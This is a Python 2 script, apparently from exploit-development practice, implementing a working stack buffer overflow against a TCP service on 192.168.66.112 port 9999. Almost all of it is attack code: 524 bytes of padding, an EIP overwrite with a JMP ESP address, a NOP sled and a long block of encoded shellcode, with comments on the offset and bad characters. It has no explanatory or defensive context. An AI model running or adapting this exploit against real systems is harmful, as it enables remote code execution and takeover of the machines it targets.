#!/usr/bin/python2
import socket
#seg fault 1600
buff="A"*524 #Offset 
buff+="\xf3\x12\x17\x31"# EIP 
buff+="\x90"*8
# bad chars = \x00
# JMP ESP : 31 17 12 f3
shellcode=("\xda\xd6\xbd\x2e\x7b\x36\x21\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
        "\x52\x31\x6f\x17\x83\xc7\x04\x03\x41\x68\xd4\xd4\x61\x66\x9a"
        "\x17\x99\x77\xfb\x9e\x7c\x46\x3b\xc4\xf5\xf9\x8b\x8e\x5b\xf6"
        "\x60\xc2\x4f\x8d\x05\xcb\x60\x26\xa3\x2d\x4f\xb7\x98\x0e\xce"
        "\x3b\xe3\x42\x30\x05\x2c\x97\x31\x42\x51\x5a\x63\x1b\x1d\xc9"
        "\x93\x28\x6b\xd2\x18\x62\x7d\x52\xfd\x33\x7c\x73\x50\x4f\x27"
        "\x53\x53\x9c\x53\xda\x4b\xc1\x5e\x94\xe0\x31\x14\x27\x20\x08"
        "\xd5\x84\x0d\xa4\x24\xd4\x4a\x03\xd7\xa3\xa2\x77\x6a\xb4\x71"
        "\x05\xb0\x31\x61\xad\x33\xe1\x4d\x4f\x97\x74\x06\x43\x5c\xf2"
        "\x40\x40\x63\xd7\xfb\x7c\xe8\xd6\x2b\xf5\xaa\xfc\xef\x5d\x68"
        "\x9c\xb6\x3b\xdf\xa1\xa8\xe3\x80\x07\xa3\x0e\xd4\x35\xee\x46"
        "\x19\x74\x10\x97\x35\x0f\x63\xa5\x9a\xbb\xeb\x85\x53\x62\xec"
        "\xea\x49\xd2\x62\x15\x72\x23\xab\xd2\x26\x73\xc3\xf3\x46\x18"
        "\x13\xfb\x92\x8f\x43\x53\x4d\x70\x33\x13\x3d\x18\x59\x9c\x62"
        "\x38\x62\x76\x0b\xd3\x99\x11\xf4\x8c\xe3\x99\x9c\xce\xe3\x58"
        "\xe6\x46\x05\x30\x08\x0f\x9e\xad\xb1\x0a\x54\x4f\x3d\x81\x11"
        "\x4f\xb5\x26\xe6\x1e\x3e\x42\xf4\xf7\xce\x19\xa6\x5e\xd0\xb7"
        "\xce\x3d\x43\x5c\x0e\x4b\x78\xcb\x59\x1c\x4e\x02\x0f\xb0\xe9"
        "\xbc\x2d\x49\x6f\x86\xf5\x96\x4c\x09\xf4\x5b\xe8\x2d\xe6\xa5"
        "\xf1\x69\x52\x7a\xa4\x27\x0c\x3c\x1e\x86\xe6\x96\xcd\x40\x6e"
        "\x6e\x3e\x53\xe8\x6f\x6b\x25\x14\xc1\xc2\x70\x2b\xee\x82\x74"
        "\x54\x12\x33\x7a\x8f\x96\x53\x99\x05\xe3\xfb\x04\xcc\x4e\x66"
        "\xb7\x3b\x8c\x9f\x34\xc9\x6d\x64\x24\xb8\x68\x20\xe2\x51\x01"
        "\x39\x87\x55\xb6\x3a\x82")
buff+=shellcode
print "Sending {}".format(len(buff))
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(("192.168.66.112",9999))
s.recv(1024)
s.send(buff+'\r\n')
s.close() 

